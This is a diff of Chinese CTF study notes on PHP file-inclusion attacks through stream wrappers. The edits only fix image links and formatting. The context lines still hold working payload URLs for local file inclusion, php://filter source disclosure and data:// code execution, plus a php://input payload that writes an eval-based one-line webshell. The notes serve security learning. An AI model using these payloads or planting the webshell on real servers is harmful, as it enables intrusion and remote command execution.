@@ -333,7 +333,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQAZ)
+     ![](img/1-CTF_WEB/bVbrQAZ.png)
 
   2. `[文件的相对路径和文件名]`
 
@@ -341,7 +341,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=./phpinfo.txt
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQA1)
+     ![](img/1-CTF_WEB/bVbrQA1.png)
 
   3. `[http：//网络路径和文件名]`
 
@@ -349,7 +349,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBb)
+     ![](img/1-CTF_WEB/bVbrQBb.png)
 
 - **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=DuT6iHHjrv6yYwe%2FL%2BXwLw%3D%3D.khro9XPxRj3wwsu1ZqN%2FR%2Bc2T9GU1D2%2BPCinvjrKORB9TsauqGBqEgNvkasA34na)
 
@@ -420,7 +420,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBf)
+     ![](img/1-CTF_WEB/bVbrQBf.png)
 
   2. `php://input + [POST DATA]`执行php代码
 
@@ -430,7 +430,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      <?php phpinfo(); ?>
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBh)
+     ![](img/1-CTF_WEB/bVbrQBh.png)
 
      若有写入权限，写入一句话木马
 
@@ -440,7 +440,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBi)
+     ![](img/1-CTF_WEB/bVbrQBi.png)
 
 - **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=juZnqmg2HQMZii5vLbm1bQ%3D%3D.f4xV6RjgZWGtUZ%2FjtD%2BE4GPxKFoDqttbkcw61aLWdrXwAqdVpt4QM0sZ%2Bw48219A)
 
@@ -463,7 +463,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBj)
+     ![](img/1-CTF_WEB/bVbrQBj.png)
 
   2. `compress.bzip2://file.bz2`
 
@@ -473,7 +473,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBt)
+     ![](img/1-CTF_WEB/bVbrQBt.png)
 
   3. `compress.zlib://file.gz`
 
@@ -483,7 +483,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBu)
+     ![](img/1-CTF_WEB/bVbrQBu.png)
 
 - **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=c7kLn2116lHYz%2Bxdh8uWLg%3D%3D.sj39fMX2XLCmDRe1yx3bXe0O%2Bl37DHiuTIrhp7TD4ecbPodccTGwi7qnB9m8IDmNVyGc5NV8nkQb6X9PUiRlow%3D%3D)
 
@@ -511,7 +511,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBB)
+     ![](img/1-CTF_WEB/bVbrQBB)
 
   2. `data://text/plain;base64,`
 
@@ -519,7 +519,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
      http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
      ```
 
-     ![图片描述](img/1-CTF_WEB/bVbrQBD)
+     ![](img/1-CTF_WEB/bVbrQBD.png)
 
 ### `http:// & https://` 协议
 
@@ -532,7 +532,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
 
 - **用法**：
 
-  ```awk
+  ```http
   http://example.com
   http://example.com/file.php?var1=val1&var2=val2
   http://user:password@example.com
@@ -547,7 +547,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
   http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
   ```
 
-  ![图片描述](img/1-CTF_WEB/bVbrQBP)
+  ![](img/1-CTF_WEB/bVbrQBP.png)
 
 ### `phar://` 协议
 
@@ -557,7 +557,7 @@ md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木�
 http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
 ```
 
-![图片描述](img/1-CTF_WEB/bVbrQBX)
+![](img/1-CTF_WEB/bVbrQBX.png)
 
 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。
 
@@ -587,7 +587,7 @@ http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip
 
 ![image-20240812173341997](img/1-CTF_WEB/image-20240812173341997.png)
 
-这里过滤了空格，我使用`%09`(Tab)绕过
+这里过滤了空格，我使用`%09`(`Tab`)绕过
 
 ![image-20240812173552674](img/1-CTF_WEB/image-20240812173552674.png)
 
